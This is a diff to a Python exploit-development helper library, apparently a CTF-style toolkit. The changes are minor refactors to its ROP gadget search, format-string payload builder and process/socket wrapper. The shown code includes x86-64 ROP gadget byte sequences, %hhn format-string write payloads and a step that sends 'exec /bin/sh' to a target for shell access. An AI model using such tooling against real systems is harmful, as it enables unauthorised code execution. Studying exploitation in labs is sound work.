@@ -58,7 +58,7 @@ class ELF:
                 elif value == 'ELF32':
                     self.wordsize = 4
                 else:
-                    raise Exception('unsupported ELF class: %s' % value)
+                    raise Exception("unsupported ELF class: %s" % value)
             elif key == 'Type':
                 if value == 'DYN (Shared object file)':
                     self.sec['pie'] = True
@@ -340,7 +340,7 @@ class ROP(ELF):
         if self.wordsize != 8:
             raise Exception('support x86-64 only')
 
-        chunk_candidates = [
+        gadget_candidates = [
             # gcc (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
             ('\x4c\x89\xfa\x4c\x89\xf6\x44\x89\xef\x41\xff\x14\xdc\x48\x83\xc3\x01\x48\x39\xeb\x75\xea', '\x48\x8b\x5c\x24\x08\x48\x8b\x6c\x24\x10\x4c\x8b\x64\x24\x18\x4c\x8b\x6c\x24\x20\x4c\x8b\x74\x24\x28\x4c\x8b\x7c\x24\x30\x48\x83\xc4\x38\xc3', False),
             # gcc (Ubuntu/Linaro 4.8.2-19ubuntu1) 4.8.2
@@ -349,7 +349,7 @@ class ROP(ELF):
             ('\x4c\x89\xfa\x4c\x89\xf6\x44\x89\xef\x41\xff\x14\xdc\x48\x83\xc3\x01\x48\x39\xeb\x72\xea', '\x48\x8b\x5c\x24\x08\x48\x8b\x6c\x24\x10\x4c\x8b\x64\x24\x18\x4c\x8b\x6c\x24\x20\x4c\x8b\x74\x24\x28\x4c\x8b\x7c\x24\x30\x48\x83\xc4\x38\xc3', False),
         ]
 
-        for chunk1, chunk2, _args_reversed in chunk_candidates:
+        for chunk1, chunk2, _args_reversed in gadget_candidates:
             try:
                 set_regs = self.gadget(chunk2)
                 call_r12 = self.gadget(chunk1 + chunk2)
@@ -357,6 +357,8 @@ class ROP(ELF):
                 break
             except ValueError:
                 pass
+        else:
+            raise Exception('gadget not found')
 
         buf = p64(set_regs)
 
@@ -618,10 +620,10 @@ class FormatStr:
         n[1] = ((n[1]-n[0]-1) % 0x100) + 1
         n[0] = ((n[0]-len(buf)-1) % 0x100) + 1
 
-        buf += '%%%dc%%%d$hhn' % (n[0], self.offset)
-        buf += '%%%dc%%%d$hhn' % (n[1], self.offset+1)
-        buf += '%%%dc%%%d$hhn' % (n[2], self.offset+2)
-        buf += '%%%dc%%%d$hhn' % (n[3], self.offset+3)
+        buf += "%%%dc%%%d$hhn" % (n[0], self.offset)
+        buf += "%%%dc%%%d$hhn" % (n[1], self.offset+1)
+        buf += "%%%dc%%%d$hhn" % (n[2], self.offset+2)
+        buf += "%%%dc%%%d$hhn" % (n[3], self.offset+3)
 
         return buf
 
@@ -630,6 +632,7 @@ class Proc:
     def __init__(self, *args, **kwargs):
         if kwargs.get('debug'):
             os.kill(os.getpid(), signal.SIGTRAP)
+
         if 'host' in kwargs and 'port' in kwargs:
             self.p = socket.create_connection((kwargs['host'], kwargs['port']))
         else:
@@ -638,16 +641,16 @@ class Proc:
             fl = fcntl.fcntl(fd, fcntl.F_GETFL)
             fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)
 
-    def write(self, s):
-        time.sleep(0.1)
+    def write(self, s, interval=0.1):
+        time.sleep(interval)
         if isinstance(self.p, Popen):
             return self.p.stdin.write(s)
         else:
             return self.p.sendall(s)
 
-    def read(self, size):
+    def read(self, size, timeout=0.1):
         if isinstance(self.p, Popen):
-            rlist, wlist, xlist = select.select([self.p.stdout], [], [], 0.1)
+            rlist, wlist, xlist = select.select([self.p.stdout], [], [], timeout)
             if rlist:
                 return self.p.stdout.read(size)
             else:
@@ -672,7 +675,7 @@ class Proc:
                 self.write('exec /bin/sh <&2 >&2\n')
             except IOError as e:
                 if e.errno == errno.EPIPE:  # Broken pipe
-                    return
+                    pass
                 else:
                     raise
             self.p.wait()
@@ -695,7 +698,7 @@ class Proc:
             p_stdout = self.p.makefile()
         p = Popen(['strings', '-tx', '-n', str(n)], stdin=p_stdout, stdout=PIPE)
         stdout, stderr = p.communicate()
-        return stdout
+        return stdout.rstrip()
 
     def write_p64(self, s):
         return self.write(p64(s))
